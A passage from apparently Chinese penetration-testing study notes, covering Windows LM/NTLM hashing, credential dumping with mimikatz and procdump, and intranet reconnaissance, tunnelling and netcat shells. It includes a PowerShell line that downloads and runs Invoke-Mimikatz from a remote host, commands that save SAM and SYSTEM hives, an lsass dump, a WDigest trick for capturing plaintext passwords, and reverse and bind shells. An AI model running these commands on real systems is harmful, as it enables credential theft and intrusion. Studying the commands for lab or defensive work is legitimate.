class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br></pre></td></tr></table></figure>

<h5 id="LM-Hash-缺点"><a href="#LM-Hash-缺点" class="headerlink" title="LM Hash 缺点"></a>LM Hash 缺点</h5><p>1.密码长度最大只能为14个字符</p>
<p>2.密码无法区分大小写</p>
<p>3.如果密码强度小于7位，那个第二个分组加密后的结果一定为 aad3b435b51404ee</p>
<p>4.Des 容易被破解 密码强度不高</p>
<br>

<p>在Windows Vista 和 Windows Server 2008 版本后 Windows默认禁用了LM Hash。LM-Hash 明文密码限制在14位以内，也就是说，如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash 通常为 aad3b435b51404eeaad3b435b51404ee</p>
<br>

<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>NT LAN Manager (NTML) Hash  是基于MD4算法。从Windows Vista/Windows Server 2003以后Windows的默认认证方式均为NTLM Hash</p>
<h5 id="NTLM-Hash生成原理"><a href="#NTLM-Hash生成原理" class="headerlink" title="NTLM Hash生成原理"></a>NTLM Hash生成原理</h5><p>1.将用户密码（转为ASCII 再）转换为十六进制</p>
<p>2.将十六进制格式的密码进行Unicode编码</p>
<p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算</p>
<br>

<p>以密码123456为例 ，</p>
<ul>
<li>首先将密码字符串转换为ASCII字符串，123456 =&gt; 49 50 51 52 53 54</li>
<li>ASCII字符串在转换为十六进制，49 50 51 52 53 54 =&gt; 31 32 33 34 35 36 </li>
<li>再进行Unicode 编码， 31 32 33 34 35 36 =&gt; </li>
</ul>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><h4 id="GetPassword"><a href="#GetPassword" class="headerlink" title="GetPassword"></a>GetPassword</h4><p>直接使用管理员权限的cmd 运行 GetPassword.exe 即可</p>
<p><img src="/posts/11da9eaf/GetPassword.png"></p>
<h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><p>可以得到系统中所有庄户的NTML Hash </p>
<p><img src="/posts/11da9eaf/PwDUmp7.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>下载地址:<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>Minikatz 用于Windows下读取已经登录过的用户的Hash 和明文密码，需要admin或者system权限</p>
<h5 id="本地交互式抓取"><a href="#本地交互式抓取" class="headerlink" title="本地交互式抓取"></a>本地交互式抓取</h5><p><code>mimikatz # privilege::debug</code> 提升权限</p>
<p><code>mimikatz # log</code> 启动日志记录功能</p>
<p><code>mimikatz # sekurlsa::logonpasswords</code> 读取存储在计算机上的明文密码和Hash值</p>
<h5 id="本地非交互式抓取"><a href="#本地非交互式抓取" class="headerlink" title="本地非交互式抓取"></a>本地非交互式抓取</h5><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; mimikatz.txt</code></p>
<h4 id="powershell-加载-mimikatz抓取"><a href="#powershell-加载-mimikatz抓取" class="headerlink" title="powershell 加载 mimikatz抓取"></a>powershell 加载 mimikatz抓取</h4><p>可以连接外网情况下</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<p>内网情况下，可以搭建一个本地web服务器，使用内网ip去访问</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.0.137/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<br>

<h4 id="通过SAM-和-System-文件抓取密码"><a href="#通过SAM-和-System-文件抓取密码" class="headerlink" title="通过SAM 和 System 文件抓取密码"></a>通过SAM 和 System 文件抓取密码</h4><p>导出SAM 文件和 System 文件<br><code>reg save hklm\sam sam.hive</code><br><code>reg save hklm\system system.hive</code><br>然后将这两个文件放到mimikatz的同目录下，运行mmimikatz<br><code>lsadump::sam /sam:sam.hive /system:system.hive</code><br><img src="/posts/11da9eaf/sam_system_hash.png"><br>得到NTLM为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>在网站上进行解密<br><img src="/posts/11da9eaf/cmd5_NTLM.png"><br>得到密码为空 （该机器密码在设置时设为了空）</p>
<p>也可以使用ophcrack （<a href="https://www.objectif-securite.ch/ophcrack%EF%BC%89">https://www.objectif-securite.ch/ophcrack）</a></p>
<p><img src="/posts/11da9eaf/ophcrack.png"></p>
<p>适用场景：获得了system权限，但是无法在目标机器上上传或使用 Mimikatz，这时候就可以使用reg命令导出Sam和System文件 然后离线读取处NTML Hash 。可以考虑使用在线解密网站或者hash 传递方式得到明文。</p>
<br>

<h4 id="使用Powershell进行Dump-Hashs"><a href="#使用Powershell进行Dump-Hashs" class="headerlink" title="使用Powershell进行Dump Hashs"></a>使用Powershell进行Dump Hashs</h4><p>………………………</p>
<h4 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h4><p>ProcDump 是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为 dump 文件,是一款微软自家出品软件，所以可以过很多杀软。</p>
<h5 id="dump-lsass-exe-进程"><a href="#dump-lsass-exe-进程" class="headerlink" title="dump lsass.exe 进程"></a>dump lsass.exe 进程</h5><p>打开任务管理器 找到 lsass.exe(Local Security Authority Process) 进程，选择创建转储文件</p>
<p><img src="/posts/11da9eaf/dump_lsass.png"></p>
<p><img src="/posts/11da9eaf/dump_lsass2.png"></p>
<p>这里生成的位置在AppData\Local 下 如果没显示该文件目录 点击组织-&gt;文件夹和搜索选项-&gt;查看 将显示的隐藏文件、文件夹和驱动器前点勾</p>
<p><img src="/posts/11da9eaf/dump_lsass3.png"></p>
<p>使用procdump.exe 导出lsass.exe</p>
<p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
<h5 id="读取dump文件"><a href="#读取dump文件" class="headerlink" title="读取dump文件"></a>读取dump文件</h5><p>然后将生成的 lsass.dmp 文件放到 mimikatz 的同目录下，运行mimikatz</p>
<p>直接读取明文密码 </p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tspkg&quot; exit</code></p>
<p>读取明文密码和hash 值(显示的信息更全)</p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; exit</code></p>
<h4 id="部分系统的抓取尝试"><a href="#部分系统的抓取尝试" class="headerlink" title="部分系统的抓取尝试"></a>部分系统的抓取尝试</h4><h5 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="Windows Server 2008 R2"></a>Windows Server 2008 R2</h5><p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
<h5 id="Windows7-x64"><a href="#Windows7-x64" class="headerlink" title="Windows7 x64"></a>Windows7 x64</h5><p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
<p>这里抓取的密码为空 因为原密码为空 看下抓取的NTLM值 与 空值的相同</p>
<br>

<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>安装 KB2871997 补丁，关闭Wdigest功能(Windows Server 2012以上版本都是默认关闭的)</p>
<p>安装完该补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。</p>
<p>通过擦好看注册表键值，可以判断Wdigest功能状态，如果该值为 1 则为开启，即可获取明文密码，如果改值为0 则明文密码就不会出现在内存中。</p>
<p>开启或关闭Wdigest 的命令:</p>
<p>（1） reg add 命令</p>
<p>开启Wdigest Auth    </p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<p>关闭Wdigest Auth</p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code></p>
<p> （2）使用powershell</p>
<p>开启Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
<p>关闭Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</code></p>
<p>(3) 利用meterpreter</p>
<p>开启Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></p>
<p>关闭Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</code></p>
<br>

<p>记录一位师傅文章的思路(<a href="https://github.com/x0rz4/Intranet-information">https://github.com/x0rz4/Intranet-information</a>)</p>
<p>拿到了admin的cmd权限，管理员使用密码登录了机器，开启了lsass.exe进程，把密码保存在了内存文件lsass进程中。</p>
<p>想要的抓取明文，修改注册表开启Wdigest ，然后利用cmd的强制锁屏，等待管理员重新输入密码登录系统，这样密码就被记录在了lsass内存文件中，然后使用procdump导出lsass.dmp，使用mimikatz进行读取明文和hash</p>
<p>强制锁屏命令:</p>
<p>cmd <code>rundll32 user32.dll,LockWorkStation</code></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>
<p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p>
<p><a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习笔记</title>
    <url>/posts/11ff0b53/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><br>

<p><code>ipconfig /all </code>查询网络配置</p>
<h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><p><code>net user </code> 查询用户列表</p>
<p><code>net user XXX /domain</code>   查询指定用户的详细信息</p>
<p><code>net localgroup administrators</code> 查看当前用户权限</p>
<p><code>net localgroup administrators 用户名 /add </code> 添加用户到管理组  `</p>
<p><code>quser</code>  / <code>quser UserName</code>  / <code>qwinsta</code>查看当前在线用户</p>
<h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><p><code>tasklist /v</code>  查询进程列表</p>
<p><code>wmic process list brief</code> 查询进程列表</p>
<h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><p><code>systeminfo</code> </p>
<p><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code> 获取操作系统和版本信息</p>
<p><img src="/posts/11ff0b53/systeminfo.png"></p>
<p><code>wmic product get name.version</code> 查看本机安装的软件和版本信息</p>
<p><img src="/posts/11ff0b53/wmic_product.png"></p>
<p><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code>  查看本机安装的软件和版本信息</p>
<p><code>netstat -ano</code> 查看端口列表</p>
<p><code>systeminfo </code>查询补丁信息</p>
<p><code>wmic qfe get description,installedOn /format:csv</code> 查看补丁信息</p>
<p><code>net share</code> 查询本机共享</p>
<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
<p><code>netsh firewall show logging</code> 防火墙日志目录</p>
<p><code>netsh advfirewall set allprofiles state off</code>  关闭防火墙（winServer 2003以后）</p>
<hr>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><h4 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h4><p><code>ipconfig /all</code>查看信息</p>
<p><code>net time /domain</code> 判断是否存在  </p>
<blockquote>
<p>存在   返回域信息和时间 </p>
<p>存在但权限不足  发生系统错误 拒绝访问</p>
<p>不存在 找不到域Workgroup的域控制器</p>
</blockquote>
<br>

<h4 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h4><h5 id="基于ICMP"><a href="#基于ICMP" class="headerlink" title="基于ICMP"></a>基于ICMP</h5><ul>
<li>windows</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,254) do @ping 192.168.56.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">%i in (1,1,254)    遍历主机位从1 ~254的所有IP </span><br><span class="line">-n    ping的次数           </span><br><span class="line">-w    等待每次回复的时长（毫秒）            </span><br><span class="line">192.168.0.%i    遍历IP 自192.168.0.1~192.168.0.254的所有IP           </span><br><span class="line">| bat    管道，将前面的结果通过管道输入给后面的命令  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/icmp_ping.png"></p>
<ul>
<li>Linux</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap ‐sP ‐PI 192.168.0.1/24 ‐T4</code></p>
<p><img src="/posts/11ff0b53/nmap_icmp.png"></p>
<br>

<h5 id="基于arp"><a href="#基于arp" class="headerlink" title="基于arp"></a>基于arp</h5><ul>
<li>arp-scan   下载地址: <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></li>
</ul>
<p>用法 <code>arp-scan.exe -t 192.168.56.0/24</code></p>
<p><img src="/posts/11ff0b53/arp-scan.png"></p>
<ul>
<li>arp</li>
</ul>
<p><code>arp -a</code></p>
<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap -sn -PR 192.168.0.1/24</code></p>
<p><img src="/posts/11ff0b53/nmap_arp.png"></p>
<ul>
<li>msf扫描</li>
</ul>
<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
<br>

<h5 id="基于udp"><a href="#基于udp" class="headerlink" title="基于udp"></a>基于udp</h5><ul>
<li>scanline</li>
</ul>
<p><code>scanline.exe 192.168.56.101</code></p>
<p><img src="/posts/11ff0b53/scanline.png"></p>
<br>

<h5 id="基于NetBIOS"><a href="#基于NetBIOS" class="headerlink" title="基于NetBIOS"></a>基于NetBIOS</h5><ul>
<li>nbtscan</li>
</ul>
<p><code>nbtscan -r 192.168.0.0/24</code></p>
<p><img src="/posts/11ff0b53/nbtscan.png"></p>
<ul>
<li>msf扫描</li>
</ul>
<p><code>use auxiliary/scanner/netbios/nbname</code><br><img src="/posts/11ff0b53/msf_netbios.png"></p>
<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap -sU --script nbstat.nse -p137 192.168.0.1/24 -T4</code></p>
<p><img src="/posts/11ff0b53/nmap_netbios.png"></p>
<br>

<h4 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h4><h5 id="利用telnet-命令进行扫描"><a href="#利用telnet-命令进行扫描" class="headerlink" title="利用telnet 命令进行扫描"></a>利用telnet 命令进行扫描</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 目标ip地址 端口号</span><br></pre></td></tr></table></figure>

<h5 id="利用msf扫描主机端口"><a href="#利用msf扫描主机端口" class="headerlink" title="利用msf扫描主机端口"></a>利用msf扫描主机端口</h5><p><code>use auxiliary/scanner/portscan/tcp</code></p>
<p><code>show options </code></p>
<p><code>set ports 1-1024 </code></p>
<p><code>set RHOSTS 192.168.56.101</code></p>
<p><code>set THREADS 10 </code></p>
<p><code>run</code></p>
<p><img src="/posts/11ff0b53/msf_portscan_tcp.png"></p>
<h4 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h4><p><code>net view /domain</code> 查看域</p>
<p><code>net view /domain:域名</code> 查看域的电脑</p>
<p><code>net group /domain</code> 查看域内用户组的列表</p>
<p><code>net group &quot;domain computers&quot; /domain </code>  查询域成员的列表</p>
<p><code>net account /domain</code></p>
<h4 id="查找域内用户和管理员"><a href="#查找域内用户和管理员" class="headerlink" title="查找域内用户和管理员"></a>查找域内用户和管理员</h4><p><code>net user /domain</code></p>
<h4 id="内网定位管理员工具"><a href="#内网定位管理员工具" class="headerlink" title="内网定位管理员工具"></a>内网定位管理员工具</h4><p>参考 <a href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
<p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p>
<ul>
<li><p>Empire  user_hunter模块</p>
</li>
<li><p>psloggedon.exe</p>
</li>
</ul>
<p><code>PsLoggedon.exe</code></p>
<ul>
<li>PVEFindADUser.exe</li>
</ul>
<p><code>PVEFindADUser.exe --current</code> 枚举出域用户以及登陆过特定系统的用户(需要管理员权限)</p>
<ul>
<li>Netsess.exe </li>
</ul>
<p>查询所有域控制器，获取所有的活跃域 </p>
<p>下载地址:<a href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>用法 <code>Netsess.exe -h</code></p>
<br>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>版本</p>
<blockquote>
<p>2.0     win2008,win7</p>
<p>3.0    win2018,win8</p>
<p>4.0    win2012R2,win8.1</p>
<p>5.0    win2016,win10</p>
</blockquote>
<p>存在4中权限</p>
<blockquote>
<p>Restricted     不允许执行任何脚本</p>
<p>Allsigned        只允许执行经过证书验证的脚本</p>
<p>Unrestricted    允许执行任何脚本</p>
<p>RemoteSigned    本地脚本不限制，对外部脚本需要经过证书验证</p>
</blockquote>
<p><code>Get-ExecutionPolicy</code>     查看PS权限</p>
<p><code>Set-ExecutionPolicy +权限</code></p>
<p>一般会用cmd 命令行  使用<code>-exec bypass</code>进行powershell绕过</p>
<h5 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h5><p>脚本地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p><code>Import-Module</code>为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1</p>
<p>格式：</p>
<p><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot;</code></p>
<p>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1; Get-NetUser}”</p>
<p>PowerView命令参数</p>
<blockquote>
<p>Get-NetDomain: 获取当前用户所在域的名称<br>Get-NetUser: 获取所有用户的详细信息<br>Get-NetDomainController: 获取所有域控制器的信息<br>Get-NetComputer: 获取域内所有机器的详细信息<br>Get-NetOU: 获取域中的OU信息<br>Get-NetGroup: 获取所有域内组和组成员信息<br>Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息<br>Get-NetShare: 获取当前域内所有网络共享信息<br>Get-NetSession: 获取指定服务器的会话<br>Get-NetRDPSession: 获取指定服务器的远程连接<br>Get-NetProcess: 获取远程主机的进程<br>Get-UserEvent: 获取指定用户的日志<br>Get-ADObiect: 获取活动目录的对象<br>Get-NetGPO: 获取域内所有的组策略对象<br>Get-DomainPolicy: 获取域默认策略或域控制器策略<br>Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限<br>Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户<br>Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</p>
</blockquote>
<br>

<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHound需要使用neo4j数据库，配备java环境</p>
<p>下载地址 <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
<blockquote>
<p>URL：neo4j://localhost:7687<br>用户名(默认)：neo4j<br>密码(默认)：neo4j</p>
</blockquote>
<p>使用【待补充 】·</p>
<hr>
<h3 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h3><p>隧道: 绕过防火墙屏蔽的一种方式</p>
<br>

<p>网络层隧道：</p>
<ul>
<li>IPv6</li>
<li>ICMP</li>
</ul>
<p>传输层</p>
<ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>应用层</p>
<ul>
<li>SSH</li>
<li>HTTP</li>
<li>DNS</li>
</ul>
<br>

<h4 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断"></a>内网连通性判断</h4><ul>
<li><p>ICMP协议</p>
<p>  ping ip</p>
</li>
<li><p>TCP协议</p>
<p>  nc  -zc ip port</p>
</li>
<li><p>HTTP协议</p>
<p>  curl ip:port</p>
</li>
<li><p>DNS协议</p>
<p>  nslookup  <a href="http://www.baidu.com/">www.baidu.com</a> </p>
<p>  dig @8.8.8.8 <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
</ul>
<br>

<br>

<h4 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h4><ul>
<li>Ipv6隧道</li>
<li>ICMP隧道</li>
</ul>
<br>

<h5 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h5><p>ICMP隧道工具：icmpsh，Pingtunnel</p>
<p>icmpsh (仅适用于windows，执行icmpsh.exe不需要管理员权限)</p>
<p>Pingtunnel</p>
<br>

<h5 id="icmpsh反弹shell"><a href="#icmpsh反弹shell" class="headerlink" title="icmpsh反弹shell"></a>icmpsh反弹shell</h5><p>参考:<a href="https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ">https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ</a></p>
<p>安装 <code>git clone https://github.com/inquisb/icmpsh.git</code></p>
<p>安装依赖库<code>sudo  pip2 install impacket</code></p>
<blockquote>
<p>环境</p>
<p>kali 192.168.0.128<br>win7 192.168.0.129</p>
</blockquote>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> 关闭本地系统的icmp应答，恢复改为0即可</p>
<p>将 icmpsh.exe传到win7中，这里开启个http服务去下载<code>python3 -m http.server 9999</code></p>
<p>win7访问192.168.0.128:9999 去下载 icmpsh.exe</p>
<p>icmpsh.exe参数</p>
<blockquote>
<p>-t host         :指定攻击者IP<br>-r              :用于测试连接<br>-d milliseconds :设置请求之间的延迟(毫秒)<br>-o milliseconds :设置响应超时时间(毫秒),超时一次则计数器+1<br>-b num          :设置多少次退出<br>-s bytes        :最大数据缓冲区大小(字节)</p>
</blockquote>
<p>kali:<code>sudo python2 icmpsh_m.py  192.168.0.128[kali] 192.168.0.129[win7]</code></p>
<p>win7 <code>icmpsh.exe -t 192.168.0.128</code></p>
<p>成功反弹shell</p>
<p><img src="/posts/11ff0b53/icmpsh_shell.png"></p>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0</code>恢复原设置</p>
<br>

<h5 id="PingTunnel使用"><a href="#PingTunnel使用" class="headerlink" title="PingTunnel使用"></a>PingTunnel使用</h5><p>【待补充】</p>
<hr>
<h4 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h4><h5 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h5><p>【待补充】</p>
<h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><p>下载地址（解压密码为nc）:</p>
<p><a href="https://joncraton.org/files/nc111nt.zip">https://joncraton.org/files/nc111nt.zip</a></p>
<p><a href="https://joncraton.org/files/nc111nt_safe.zip">https://joncraton.org/files/nc111nt_safe.zip</a></p>
<br>

<h6 id="获取banner信息"><a href="#获取banner信息" class="headerlink" title="获取banner信息"></a>获取banner信息</h6><p><code>nc -nv 192.168.0.130 22</code></p>
<p><img src="/posts/11ff0b53/nc_nv.png"></p>
<h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><p><code>nc -zv 192.168.56.101 1080</code></p>
<p><img src="/posts/11ff0b53/nc_portscan.png">              </p>
<h6 id="远程连接主机"><a href="#远程连接主机" class="headerlink" title="远程连接主机"></a>远程连接主机</h6><p><code>nc -nvv 192.168.0.129 80</code>                                                     </p>
<h6 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h6><p><code>nc -lp 9999</code> 监听本地9999端口，访问该端口是会输出信息</p>
<h6 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h6><p>Ubuntu: <code>nc -lp 6666 &gt; test.txt</code> 开启监听</p>
<p>kali：<code>echo &#39;test&#39; &gt; test.txt</code></p>
<p><code>nc -vn 192.168.0.130 6666 &lt; test.txt -q 1</code></p>
<p><img src="/posts/11ff0b53/nc_file.png"></p>
<h6 id="简易聊天"><a href="#简易聊天" class="headerlink" title="简易聊天"></a>简易聊天</h6><p>Ubuntu: <code>nc -l -p 8888</code></p>
<p>kali：<code>nc -vn 192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_talk.png"></p>
<h5 id="nc获取shell"><a href="#nc获取shell" class="headerlink" title="nc获取shell"></a>nc获取shell</h5><p>参考 <a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://www.jianshu.com/p/91dd4ab317c7">https://www.jianshu.com/p/91dd4ab317c7</a></p>
<br>

<blockquote>
<p>正向shell   目标机进行监听<br>反向shell   攻击机进行监听</p>
</blockquote>
<h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><p>客户端连接服务器，客户端获取服务端的shell （kali【攻击机】连接，目标机监听）</p>
<p>目标机： <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>攻击机：<code>nc 192.168.0.128 8888</code></p>
<br>

<p><img src="/posts/11ff0b53/nc_ubuntu_error.png"></p>
<p>这里我使用Ubuntu作为目标机器是 使用-e 参数会报错，使用版本不同，这里ubuntu默认版本的nc为netcat-openbsd ，没有-e参数 而netcat-traditional版本[v1.10-41.1] 的存在-e选项，kali也是默认该版本的nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#给Ubuntu替换一个nc版本 参考https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;91dd4ab317c7</span><br><span class="line">sudo apt-get -y install netcat-traditional </span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/ubuntu_nc_tra.png"></p>
<p>成功切换ubuntu的nc版本</p>
<br>

<p>依旧使用kali作为攻击机，ubuntu作为目标机</p>
<p>ubuntu: <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>kali: <code>nc  192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_shell1.png"></p>
